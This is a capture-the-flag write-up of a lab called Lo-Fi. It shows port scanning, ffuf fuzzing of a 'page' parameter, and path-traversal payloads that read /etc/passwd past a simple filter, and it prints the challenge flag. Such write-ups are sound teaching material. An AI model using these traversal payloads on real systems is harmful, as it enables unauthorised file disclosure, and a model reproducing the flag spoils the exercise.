# Lo-Fi - CTF

## Target Information

- **IP Address**: `10.10.7.147`

![alt text](/assets/img/posts/2025-02-02-THM-Lo-Fi/0.png)

## Hints

- **LFI (Local File Inclusion) Path Traversal**
- **File Inclusion Vulnerability**

## Enumeration

### RustScan

**Command:**

```bash
rustscan -a 10.10.7.147
```

**Results:**

```
Open 10.10.7.147:22
Open 10.10.7.147:80
```

### Nmap

**Command:**

```bash
nmap -sV -A -p 22,80 10.10.7.147
```

**Results:**

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Website Analysis

After accessing the website, I noticed that navigating through different pages only changed the `page` parameter in the URL:

```
http://10.10.7.147/?page=
```

This indicates a potential **Local File Inclusion (LFI)** vulnerability.

Upon testing **http://10.10.7.147/?page=/etc/passwd**

![alt text](/assets/img/posts/2025-02-02-THM-Lo-Fi/3.png)

An alert message appeared:

```
HACKKERRR!! HACKER DETECTED. STOP HACKING YOU STINKIN HACKER!
```

This suggests that the server has implemented some level of security measures to detect and prevent direct access to system files.

## Exploitation

### FFUF (Fuzzing)

To identify possible LFI vulnerabilities, I used **ffuf**:

**Command:**

```bash
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://10.10.7.147/?page=FUZZ" -fl 124
```
    Explanation:

    -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt
    Uses the LFI-Jhaddix.txt wordlist, which contains common Local File Inclusion (LFI) payloads.

    -u "http://10.10.7.147/?page=FUZZ"
    The target URL where FUZZ is dynamically replaced with entries from the wordlist.

    -fl 124
    Filters out responses with exactly 124 bytes, helping to ignore default or irrelevant results.

**Results:**
Several potential LFI paths were identified. The next step was to test them manually.

#### Testing LFI

1. Attempted **directory traversal** to bypass the detection mechanism:

   ```
   http://10.10.7.147/?page=../../../etc/passwd
   ```

    ![alt text](/assets/img/posts/2025-02-02-THM-Lo-Fi/4.png)

   This worked successfully, confirming the vulnerability and bypassing the detection system.

2. Attempted retrieving the flag using LFI:

   ```
   http://10.10.7.147/?page=../../../flag.txt
   ```

   Successfully retrieved the flag!

    ![alt text](/assets/img/posts/2025-02-02-THM-Lo-Fi/5.png)

   **Flag:** `flag{e4478e0eab69bd642b8238765dcb7d18}`
